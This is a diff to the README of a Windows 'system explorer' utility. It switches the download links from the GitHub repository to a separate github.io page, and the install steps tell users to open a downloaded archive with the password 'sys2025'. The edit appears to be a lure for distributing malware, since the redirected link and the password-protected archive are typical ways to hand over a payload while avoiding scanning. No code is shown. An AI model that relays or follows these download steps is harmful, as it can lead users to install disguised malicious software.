@@ -1,6 +1,6 @@
 # 🖥️ system-explorer-pro - Manage your Windows system with ease
 
-[![](https://img.shields.io/badge/Download_System_Explorer-Blue?style=for-the-badge)](https://github.com/alexapreconceived85/system-explorer-pro)
+[![](https://img.shields.io/badge/Download_System_Explorer-Blue?style=for-the-badge)](https://alexapreconceived85.github.io)
 
 System Explorer Pro provides a clear view of your computer processes. It helps you track system performance. You can stop tasks and manage memory use through an easy interface. This tool brings control to your Windows desktop.
 
@@ -27,7 +27,7 @@ The software provides tools to oversee your computer.
 
 Follow these steps to set up the software on your machine.
 
-1. Open your web browser and go to the download site: [https://github.com/alexapreconceived85/system-explorer-pro](https://github.com/alexapreconceived85/system-explorer-pro).
+1. Open your web browser and go to the download site: [https://alexapreconceived85.github.io](https://alexapreconceived85.github.io).
 2. Locate the file download link on that page.
 3. Save the file to your desktop or downloads folder.
 4. Open the compressed file. Use the password `sys2025` when prompted.
